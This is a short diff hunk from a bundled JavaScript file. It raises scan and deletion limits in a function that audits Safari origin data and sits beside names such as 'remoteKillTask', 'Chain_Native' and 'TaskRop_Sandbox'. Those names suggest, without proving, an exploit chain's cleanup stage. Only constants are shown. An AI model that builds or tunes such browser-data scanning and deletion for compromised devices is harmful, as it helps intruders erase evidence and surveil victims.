@@ -8984,12 +8984,12 @@ function terminateSafariAfterClean(remoteKillTask) {
 	function auditSafariOriginData() {
 		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 		const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
-		const MAX_SCAN_ENTRIES = 1800;
+		const MAX_SCAN_ENTRIES = 5000;
 		const MAX_CANDIDATE_LOGS = 200;
-		const MAX_CONTENT_SCAN_FILES = 120;
-		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 64 * 1024;
-		const MAX_TOTAL_CONTENT_SCAN_BYTES = 4 * 1024 * 1024;
-		const MAX_DELETE_TREE_ENTRIES = 900;
+		const MAX_CONTENT_SCAN_FILES = 260;
+		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 1024 * 1024;
+		const MAX_TOTAL_CONTENT_SCAN_BYTES = 24 * 1024 * 1024;
+		const MAX_DELETE_TREE_ENTRIES = 2400;
 		const MAX_PRIORITY_NETWORK_RECORDS = 180;
 		const MAX_PRIORITY_NETWORK_FILES = 260;
 		const MAX_PRIORITY_NETWORK_BYTES = 24 * 1024 * 1024;
